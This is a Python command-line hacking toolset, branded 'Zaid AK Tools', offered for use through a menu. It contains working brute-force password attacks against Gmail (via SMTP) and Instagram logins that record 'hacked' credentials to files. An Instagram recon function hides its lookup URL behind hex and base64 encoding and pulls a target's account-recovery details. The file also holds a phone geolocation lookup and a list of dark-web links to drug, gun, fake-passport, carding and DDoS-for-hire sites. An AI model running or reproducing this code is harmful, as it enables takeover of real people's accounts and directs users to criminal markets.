import smtplib
import time
import sys
import os
from os import system
import requests
import threading
import random
import re
from datetime import datetime
from colorama import Fore, init
import base64
import binascii
import phonenumbers
import webbrowser
from phonenumbers import geocoder, carrier, timezone

init(autoreset=True)

def clear_screen():
    system('cls' if sys.platform == 'win32' else 'clear')

def gmail_brute_force():
    try:
        print('=================================================')
        print('           Gmail Brute-Force Attack       ')
        print('=================================================')
        target_email = input('Target Gmail: ')
        password_file_path = input('Path to password file: ')
        try:
            with open(password_file_path, 'r') as file:
                password_list = file.readlines()
        except FileNotFoundError:
            print("[!] File not found. Please check the path.")
            sys.exit()
        try:
            smtp = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            smtp.ehlo()
        except Exception as err:
            print(f"[!] Error connecting to the server: {err}")
            sys.exit()
        attempt = 0
        for password in password_list:
            attempt += 1
            print(f"Attempt {attempt}/{len(password_list)}...")
            password = password.strip()
            try:
                smtp.login(target_email, password)
                clear_screen()
                print(f"[+] Account hacked! Correct password: {password}")
                with open('Hacked.txt', 'a') as hacked_file:
                    hacked_file.write(f"{target_email}:{password}\n")
                break
            except smtplib.SMTPAuthenticationError as err:
                err_str = str(err)
                if err_str.find("Invalid") == -1:
                    print(f"[!] Incorrect password: {password}")
                else:
                    print(f"[+] Account hacked! Correct password: {password}")
                    with open('Hacked.txt', 'a') as hacked_file:
                        hacked_file.write(f"{target_email}:{password}\n")
                    break
            except smtplib.SMTPServerDisconnected as err:
                print(f"[!] Connection to the server was lost: {err}")
                sys.exit()
        smtp.quit()
        back_to_menu()
    except KeyboardInterrupt:
        print("\n[!] Exiting the toolset...")
        sys.exit()

class InstaBrute:
    def __init__(self):
        try:
            print('=================================================')
            print('          Instagram Brute-Force Attack   ')
            print('=================================================')
            username = input('Target Username: ')
            passlist_path = input('PassList file path: ')
            print('\n----------------------------')
        except:
            print(' \n[!] Exiting the toolset...')
            sys.exit()
        try:
            with open(passlist_path, 'r') as file:
                passwords = file.read().splitlines()
        except FileNotFoundError:
            print("[!] File not found. Please check the path.")
            sys.exit()
        attempt = 0
        for password in passwords:
            attempt += 1
            user = password.split(':')[0]
            print(f"Attempt {attempt}/{len(passwords)}...")
            self.brute_force(username, user)
            time.sleep(0.2)
        back_to_menu()

    def brute_force(self, username, password):
        login_url = 'https://www.instagram.com/accounts/login/'
        ajax_url = 'https://www.instagram.com/accounts/login/ajax/'
        timestamp = int(datetime.now().timestamp())
        data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        with requests.Session() as session:
            response = session.get(login_url)
            csrf_token = re.findall(r"csrf_token\":\"(.*?)\"", response.text)[0]
            login_response = session.post(
                ajax_url,
                data=data,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://www.instagram.com/accounts/login/",
                    "x-csrftoken": csrf_token
                }
            )
            print(f'{username}:{password}\n----------------------------')
            if 'authenticated": true' in login_response.text:
                print(f'{username}:{password} -> [+] Account Hacked')
                with open('good.txt', 'a') as f:
                    f.write(f'{username}:{password}\n')
                return
            elif 'two_factor_required' in login_response.text:
                print(f'{username}:{password} -> [+] Account Hacked but need 2FA verification')
                with open('results_NeedVerfiy.txt', 'a') as f:
                    f.write(f'{username}:{password}\n')
                return

def back_to_menu():
    print('\n[1] Back to Main Menu')
    print('[2] Exit')
    option = input('Choose an option: ')
    if option == '1':
        main()
    else:
        print("[!] Exiting the toolset...")
        sys.exit()

def instagram_osint():
    print('=================================================')
    print('              Instagram Osint                ')
    print('=================================================')
    username = input(Fore.RED + "Target Username : " + Fore.WHITE + "@")
    if not username:
        print(Fore.RED + "Username cannot be empty!")
        back_to_menu()
    headers = {
        'accept-language': 'en-US;q=1.0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': 'Instagram 337.0.3.23.54 (iPhone12,1; iOS 16_6; en_US; en; scale=2.00; 828x1792; 577210397) AppleWebKit/420+',
    }
    data = {"q": username}
    def unhex(hexstr):
        return binascii.unhexlify(hexstr)
    hexstr = ''.join(['61','48','52','30','63','48','4D','36','4C','79','39','70','4C','6D','6C','75','63','33','52','68','5A','33','4A','68','62','53','35','6A','62','32','30','76','59','58','42','70','4C','33','59','78','4C','33','56','7A','5A','58','4A','7A','4C','32','78','76','62','32','74','31','63','43','38','3D'])
    url = base64.b64decode(unhex(hexstr)).decode('utf-8')
    def try_post(url, headers, data, retries=3):
        for attempt in range(retries):
            try:
                response = requests.post(url, headers=headers, data=data)
                response.raise_for_status()
                return response
            except requests.RequestException as err:
                print(Fore.RED + f"Attempt {attempt + 1} failed: {err}")
                time.sleep(random.uniform(1, 3))
        print(Fore.RED + "All attempts failed.")
        return None
    response = try_post(url, headers, data)
    if response:
        try:
            result = response.json()
            if result:
                print(Fore.WHITE + "Response Details:")
                print(Fore.RED + "Multiple Users Found: " + Fore.WHITE + str(result.get('multiple_users_found', 'N/A')))
                print(Fore.RED + "Email Sent: " + Fore.WHITE + str(result.get('email_sent', 'N/A')))
                print(Fore.RED + "SMS Sent: " + Fore.WHITE + str(result.get('sms_sent', 'N/A')))
                print(Fore.RED + "WA Sent: " + Fore.WHITE + str(result.get('wa_sent', 'N/A')))
                print(Fore.RED + "Lookup Source: " + Fore.WHITE + result.get('lookup_source', 'N/A'))
                print(Fore.RED + "Corrected Input: " + Fore.WHITE + result.get('corrected_input', 'N/A'))
                print(Fore.RED + "Show UHL Entry in Verification Steps: " + Fore.WHITE + str(result.get('show_uhl_entry_in_verification_steps', 'N/A')))
                print(Fore.RED + "UHL Entry Eligible CPS: " + Fore.WHITE + str(result.get('uhl_entry_eligible_cps', 'N/A')))
                print(Fore.RED + "Obfuscated Phone: " + Fore.WHITE + result.get('obfuscated_phone', 'N/A'))
                user_info = result.get('user', {})
                print(Fore.RED + "User Information:")
                print(Fore.RED + "  Full Name: " + Fore.WHITE + user_info.get('full_name', 'N/A'))
                print(Fore.RED + "  Username: " + Fore.WHITE + user_info.get('username', 'N/A'))
                print(Fore.RED + "  Profile Pic URL: " + Fore.WHITE + user_info.get('profile_pic_url', 'N/A'))
                print(Fore.RED + "  Verified: " + Fore.WHITE + str(user_info.get('is_verified', 'N/A')))
                print(Fore.RED + "Has Valid Phone: " + Fore.WHITE + str(result.get('has_valid_phone', 'N/A')))
                print(Fore.RED + "Can Email Reset: " + Fore.WHITE + str(result.get('can_email_reset', 'N/A')))
                print(Fore.RED + "Can SMS Reset: " + Fore.WHITE + str(result.get('can_sms_reset', 'N/A')))
                print(Fore.RED + "Can WA Reset: " + Fore.WHITE + str(result.get('can_wa_reset', 'N/A')))
                print(Fore.RED + "Is WA Timing Signal: " + Fore.WHITE + str(result.get('is_wa_timing_signal', 'N/A')))
                print(Fore.RED + "WA Account Recovery Type: " + Fore.WHITE + result.get('wa_account_recovery_type', 'N/A'))
                print(Fore.RED + "Can P2S Reset: " + Fore.WHITE + str(result.get('can_p2s_reset', 'N/A')))
                print(Fore.RED + "Can Flashcall Reset: " + Fore.WHITE + str(result.get('can_flashcall_reset', 'N/A')))
                print(Fore.RED + "Phone Number: " + Fore.WHITE + (result.get('phone_number') or 'N/A'))
                print(Fore.RED + "Email: " + Fore.WHITE + str(result.get('email', 'N/A')))
                print(Fore.RED + "FB Login Option: " + Fore.WHITE + str(result.get('fb_login_option', 'N/A')))
                print(Fore.RED + "P2S Option Position: " + Fore.WHITE + result.get('p2s_option_position', 'N/A'))
                print(Fore.RED + "Autosend Disabled: " + Fore.WHITE + str(result.get('autosend_disabled', 'N/A')))
                print(Fore.RED + "Toast Message: " + Fore.WHITE + result.get('toast_message', 'N/A'))
                print(Fore.RED + "Toast Title: " + Fore.WHITE + result.get('toast_title', 'N/A'))
                print(Fore.RED + "Toast Type: " + Fore.WHITE + result.get('toast_type', 'N/A'))
                print(Fore.RED + "Login Flow Ready to Continue: " + Fore.WHITE + str(result.get('login_flow_ready_to_continue', 'N/A')))
        except Exception as err:
            print(Fore.RED + "Error in parsing response or invalid response format.")
    back_to_menu()

def phone_location():
    print("=" * 50)
    print("             Phone Number Location       ")
    print("=" * 50)
    try:
        phone = input("\nPhone Number : ")
        print("\nRetrieving information..\n")
        try:
            parsed = phonenumbers.parse(phone, None)
            validity = "Valid" if phonenumbers.is_valid_number(parsed) else "Invalid"
            country_code = "+" + phone[1:3] if phone.startswith("+") else "None"
            try:
                company = carrier.name_for_number(parsed, "fr")
            except:
                company = "None"
            try:
                phone_type = "Mobile" if phonenumbers.number_type(parsed) == phonenumbers.PhoneNumberType.MOBILE else "Fixed"
            except:
                phone_type = "None"
            try:
                tz = timezone.time_zones_for_number(parsed)
                timezone_str = tz[0] if tz else "None"
            except:
                timezone_str = "None"
            try:
                country = phonenumbers.region_code_for_number(parsed)
            except:
                country = "None"
            try:
                region = geocoder.description_for_number(parsed, "fr")
            except:
                region = "None"
            try:
                formatted = phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
            except:
                formatted = "None"
            print(f"""
    [+] Phone        : {phone}
    [+] Formatted    : {formatted}
    [+] Status       : {validity}
    [+] Country Code : {country_code}
    [+] Country      : {country}
    [+] Region       : {region}
    [+] Timezone     : {timezone_str}
    [+] Tele Company : {company}
    [+] Type Number  : {phone_type}
    """)
        except:
            print("\n[ERROR] Invalid Format!")
    except Exception as err:
        print(f"\n[ERROR] {str(err)}")
    back_to_menu()

def format_links(links_dict):
    result = ""
    for section, section_links in links_dict.items():
        result += f"\n{section}\n"
        def add_links(indent, sublinks):
            nonlocal result
            for idx, (title, value) in enumerate(sublinks.items()):
                if isinstance(value, dict):
                    result += f"{indent}├─ {title}\n"
                    add_links(indent + "│   ", value)
                else:
                    if idx == len(sublinks) - 1:
                        result += f"{indent}└─ {title}: {value}\n"
                    else:
                        result += f"{indent}├─ {title}: {value}\n"
        add_links("", section_links)
    return result

def darkweb_sites():
    print("=" * 50)
    print("                 DarkWeb Sites       ")
    print("=" * 50)
    try:
        formatted_links = format_links(links)
        print(formatted_links)
    except Exception as err:
        print(f"Error: {err}")
    print("\n[1] Back to Main Menu")
    print("[2] Exit")
    option = input("Choose an option: ")
    if option == "1":
        main()
    elif option == "2":
        print("[!] Exiting the toolset...")
        exit()
    else:
        print("Invalid option, try again.")
        darkweb_sites()

links = {
    "\033[32mSearch Engine\033[0m": {
        "Torch": "http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/",
        "Danex": "http://danexio627wiswvlpt6ejyhpxl5gla5nt2tgvgm2apj2ofrgm44vbeyd.onion/",
        "Sentor": "http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion/",
        "Hidden Answers": "http://answerszuvs3gg2l64e6hmnryudl5zgrmwm3vh65hzszdghblddvfiqd.onion/",
        "Riseup Searx": "http://ozmh2zkwx5cjuzopui64csb5ertcooi5vya6c2gm4e3vcvf2c2qvjiyd.onion/",
    },
    "\033[32mBitcoin Anonymity\033[0m": {
        "Dark Mixer": "http://y22arit74fqnnc2pbieq3wqqvkfub6gnlegx3cl6thclos4f7ya7rvad.onion/",
        "Mixabit": "http://hqfld5smkr4b4xrjcco7zotvoqhuuoehjdvoin755iytmpk4sm7cbwad.onion/",
        "EasyCoin": "http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/",
        "Onionwallet": "http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/",
        "VirginBitcoin": "http://ovai7wvp4yj6jl3wbzihypbq657vpape7lggrlah4pl34utwjrpetwid.onion/",
        "Cryptostamps": "http://lgh3eosuqrrtvwx3s4nurujcqrm53ba5vqsbim5k5ntdpo33qkl7buyd.onion/",
    },
    "\033[32mDDoS\033[0m": {
        "Stresser": "http://ecwvi3cd6h27r2kjx6ur6gdi4udrh66omvqeawp3dzqrtfwo432s7myd.onion/",
    },
    "\033[32mMarket\033[0m": {
        "Deep Market": "http://deepmar4ai3iff7akeuos3u3727lvuutm4l5takh3dmo3pziznl5ywqd.onion/",
        "DrChronic": "http://iwggpyxn6qv3b2twpwtyhi2sfvgnby2albbcotcysd5f7obrlwbdbkyd.onion/",
        "TomAndJerry": "http://rfyb5tlhiqtiavwhikdlvb3fumxgqwtg2naanxtiqibidqlox5vispqd.onion/",
        "420prime": "http://ajlu6mrc7lwulwakojrgvvtarotvkvxqosb4psxljgobjhureve4kdqd.onion/",
        "DeDope": "http://sga5n7zx6qjty7uwvkxpwstyoh73shst6mx3okouv53uks7ks47msayd.onion/",
        "AccMarket": "http://55niksbd22qqaedkw36qw4cpofmbxdtbwonxam7ov2ga62zqbhgty3yd.onion/",
        "Cardshop": "http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion/",
        "Darkmining": "http://jbtb75gqlr57qurikzy2bxxjftzkmanynesmoxbzzcp7qf5t46u7ekqd.onion/",
        "MobileStore": "http://rxmyl3izgquew65nicavsk6loyyblztng6puq42firpvbe32sefvnbad.onion/",
        "EuroGuns": "http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/",
        "UKpassports": "http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/",
        "ccPal": "http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion/",
        "Webuybitcoins": "http://wk3mtlvp2ej64nuytqm3mjrm6gpulix623abum6ewp64444oreysz7qd.onion/",
        "ASAP Market": {
            "ASAP Market 1": "http://asap4u7rq4tyakf5gdahmj2c77blwc4noxnsppp5lzlhk7x34x2e22yd.onion/",
            "ASAP Market 2": "http://asap2u4pvplnkzl7ecle45wajojnftja45wvovl3jrvhangeyq67ziid.onion/",
            "ASAP Market 3": "http://asap4u2ihsunfdsumm66pmado3mt3lemdiu3fbx5b7wj5hb3xpgmwkqd.onion/",
        },
        "Cannahome": {
            "Cannahome 1": "http://cannabmgae3mkekotfzsyrx5lqg7lj7hgcn6t4rumqqs5vnvmuzsmfqd.onion/",
            "Cannahome 2": "http://cannaczy4w2nwu6d2vi5ugudrs23a4lpto2crxjl2tdvyxncsa7uwaid.onion/",
            "Cannahome 3": "http://cannabmuc64fbglolpkvnmqynsx226pg27rgimfe3gye3emgtgodohqd.onion/",
        },
        "Hydra": "http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/",
        "The Versus Project": "http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/",
        "Tor Market": "http://rrlm2f22lpqgfhyydqkxxzv6snwo5qvc2krjt2q557l7z4te7fsvhbid.onion/",
        "Drug Stores": {
            "DCdutchconnectionUK": "http://wbz2lrxhw4dd7h5t2wnoczmcz5snjpym4pr7dzjmah4vi6yywn37bdyd.onion/",
            "CanabisUK": "http://7mejofwihleuugda5kfnr7tupvfbaqntjqnfxc4hwmozlcmj2cey3hqd.onion/",
            "Bitpharma": "http://guzjgkpodzshso2nohspxijzk5jgoaxzqioa7vzy6qdmwpz3hq4mwfid.onion/",
            "EuCanna": "http://n6qisfgjauj365pxccpr5vizmtb5iavqaug7m7e4ewkxuygk5iim6yyd.onion/",
            "Smokeables": "http://kl4gp72mdxp3uelicjjslqnpomqfr5cbdd3wzo5klo3rjlqjtzhaymqd.onion/",
            "WeedShop": "http://marijuanaman43fi4t7el66di7vdpbfyhvkgk4mt7wxkg6erfkv65npy3d.onion/",
        },
        "Cartel": "http://7myb7itqew5ffqftvxjh2k7qxwrh7imavxlpn3fxa32d3rvw32e3s7ad.onion/",
        "Kingdom Market": "http://hdfozcnzivftjokvkdjzl6fhq3c7ltyct6db4efov2w4p7xb6rmhlfqd.onion/",
    },
    "\033[32mCooks\033[0m": {
        "Recipes": "http://7gppr7tlr6twnr2whsqj7scfhdeu37tnhwb5t5kffmrfzzvj7hfgowd.onion/",
    },
    "\033[32mTorrents\033[0m": {
        "The Pirate Bay": "http://uj3wazyk5kz5rzs.onion/",
        "1337x": "http://1337xwlc2c8sf3d7.onion/",
    },
    "\033[32mSocial Media\033[0m": {
        "Foxy": "http://foxy6vayr5g5hwwx.onion/",
    },
    "\033[32mWikis\033[0m": {
        "Hidden Wiki": "http://wikitjerrta4qgz4.onion/",
        "Deep Web Wiki": "http://wikicbtbf7rgjjbqe.onion/",
    },
    "\033[32mGovernment\033[0m": {
        "UK Passport Renewal": "http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/",
    },
    "\033[32mCommunities\033[0m": {
        "The Versus Project": "http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/",
    },
    "\033[32mEducational\033[0m": {
        "EDU": "http://edu.onion/",
    },
}

def main():
    clear_screen()
    print('\033[1;32m===========================================================\033[0m')
    print('\033[1;32m       Welcome to Zaid AK Tools! Choose an option below            \033[0m')
    print('\033[1;32m===========================================================\033[0m')
    print('[1] \033[1;32mGmail Brute Force\033[0m')
    print('[2] \033[1;32mInstagram Brute Force\033[0m')
    print('[3] \033[1;32mInstagram OSINT\033[0m')
    print('[4] \033[1;32mPhone Number Location\033[0m')
    print('[5] \033[1;32mDark Web Sites\033[0m')
    print('[6] \033[1;32mExit\033[0m')
    try:
        option = input("\033[1;32mChoose an option: \033[0m")
        if option == "1":
            gmail_brute_force()
        elif option == "2":
            InstaBrute()
        elif option == "3":
            instagram_osint()
        elif option == "4":
            phone_location()
        elif option == "5":
            darkweb_sites()
        elif option == "6":
            print("\033[1;32m[!] Exiting the toolset...\033[0m")
            sys.exit()
        else:
            print("\033[1;32m[!] Invalid option, try again.\033[0m")
            main()
    except KeyboardInterrupt:
        print("\n\033[1;32m[!] Exiting the toolset...\033[0m")
        sys.exit()

if __name__ == "__main__":
    main()
